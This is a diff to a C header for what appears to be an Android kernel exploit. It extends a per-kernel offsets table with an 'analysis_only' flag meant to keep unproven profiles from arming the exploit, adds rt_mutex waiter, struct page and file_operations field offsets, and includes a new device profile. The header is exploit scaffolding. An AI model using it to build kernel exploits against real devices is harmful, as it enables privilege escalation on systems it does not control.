@@ -5,6 +5,11 @@
 
 struct kernel_offsets {
   const char *uname_r;
+  /* Profiles may be committed before every dangerous address/geometry value
+   * is proven.  Such entries are visible to offline tooling but must never
+   * arm the exploit. */
+  uint8_t analysis_only;
+  const char *analysis_blocker;
   /* Physical load address of the kernel image, chosen by the bootloader.
    * Varies per SoC/board and is not derivable from boot.img — read it from
    * "Kernel code" in /proc/iomem on a rooted unit of the same model
@@ -70,10 +75,18 @@ struct kernel_offsets {
   uint32_t waiter_compact;
   uint64_t kimage_text_base;
 
+  /* Layout values which were previously hard-coded for one reference GKI.
+   * Vendor 5.15 kernels can and do differ. */
+  uint32_t waiter_pi_tree, waiter_task, waiter_lock, waiter_wake_state;
+  uint32_t waiter_ww_ctx;
+  uint32_t struct_page_size, struct_page_compound_head;
+  uint32_t struct_page_type, struct_slab_cache;
+
   /* Per-kernel-version file_operations field offsets.
    * 0 = use target.h default (6.12 layout with fop_flags).
    * 5.10/6.1 lack fop_flags so every field before .unlocked_ioctl shifts. */
   uint32_t fops_llseek, fops_read, fops_write, fops_read_iter, fops_write_iter;
+  uint32_t fops_ioctl, fops_compat_ioctl, fops_mmap;
   uint32_t fops_open, fops_release, fops_splice_read, fops_show_fdinfo;
 };
 
@@ -123,6 +136,7 @@ struct kernel_offsets {
 
 static const struct kernel_offsets known_offsets[] = {
 #include "sabrina/offsets.h"
+#include "tcl_v643/offsets.h"
   { .uname_r = NULL }
 };
 
